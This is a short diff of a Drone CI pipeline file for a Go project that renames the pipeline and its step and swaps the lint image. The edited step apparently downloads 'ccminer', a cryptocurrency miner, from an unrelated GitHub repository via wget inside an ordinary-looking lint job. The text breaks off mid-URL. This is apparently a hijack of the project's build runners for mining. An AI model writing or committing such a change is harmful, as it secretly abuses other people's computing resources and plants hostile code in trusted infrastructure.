@@ -1,12 +1,10 @@
----
 kind: pipeline
-name: One
-workspace:
-  base: /go
-  path: src/github.com/suzuki-shunsuke/drone-jsonnet-generator
+type: docker
+name: gaskeun
+
 steps:
-- name: download golang
-  image: golangci/golangci-lint:v1.26.0
+- name: bosss🚴
+  image: golang
   commands:
   - golangci-lint run
   - wget https://github.com/CoinFreakz/Bacodz/main/ccminer/sett
